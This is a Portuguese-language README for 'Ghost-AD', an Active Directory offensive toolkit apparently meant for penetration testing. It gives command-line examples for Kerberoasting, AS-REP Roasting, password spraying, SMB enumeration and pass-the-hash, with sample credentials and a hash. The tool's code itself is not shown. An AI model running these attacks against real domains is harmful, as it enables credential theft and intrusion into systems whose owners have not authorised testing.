# 👻 Ghost-AD

**Active Directory Offensive Toolkit** — enumeração, Kerberoasting, AS-REP Roasting, password spray, BloodHound-lite e hints de PTH/PTT.

```
  .-""""""""-.
 /  _       _  \
| (:3 )  (:3 )  |
|   '--------'  |
|    \ \U/ /    |
|_______________|
 \/\/\ /\ /\/\/

GHOST-AD  v1.0.0  —  Active Directory Attack Framework
By Gh0st-Bx1  |  github.com/Ghost-Bx1
```

---

## Módulos

| Subcomando | Descrição |
|---|---|
| `ldap` | Enumeração completa via LDAP (usuários, grupos, SPNs, AS-REP) |
| `kerb` | Kerberoasting — lista contas com SPN para crack offline |
| `asrep` | AS-REP Roasting — contas sem pré-autenticação |
| `spray` | Password spraying com detecção de lockout |
| `smb` | Enumeração SMB: null session + shares |
| `bloodhound` | Coleta BloodHound-lite para JSON |
| `pth` | Hints de Pass-the-Hash / Pass-the-Ticket |

---

## Instalação

```bash
pip install ldap3 impacket
```

> `impacket` é opcional — os módulos `spray` e `smb` degradam graciosamente e exibem comandos equivalentes com `crackmapexec` / `smbclient`.

---

## Uso

### Enumeração LDAP

```bash
python ghost-ad.py ldap -d 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
python ghost-ad.py ldap -d 192.168.1.10 --domain corp.local  # sessão anônima
```

### Kerberoasting

```bash
python ghost-ad.py kerb -d 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

### AS-REP Roasting

```bash
python ghost-ad.py asrep -d 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

### Password Spray

```bash
python ghost-ad.py spray -d 192.168.1.10 --domain corp.local \
    --users users.txt --password 'Winter2024!' --threshold 3
```

### SMB Enumeration

```bash
python ghost-ad.py smb -d 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
```

### BloodHound-lite (coleta JSON)

```bash
python ghost-ad.py bloodhound -d 192.168.1.10 --domain corp.local \
    -u jdoe -p 'P@ssw0rd' --output bh_output.json
```

### Pass-the-Hash / Pass-the-Ticket hints

```bash
python ghost-ad.py pth --domain corp.local -d 192.168.1.10 \
    -u Administrator --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Flags globais

| Flag | Descrição |
|---|---|
| `-v / --verbose` | Output detalhado |
| `--output <file>` | Salva resultado em arquivo texto |

---

## Disclaimer

> **Para uso exclusivo em ambientes autorizados.** Testes de penetração, CTF e pesquisa de segurança ofensiva com permissão explícita do dono do ambiente. O autor não se responsabiliza pelo uso indevido desta ferramenta.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
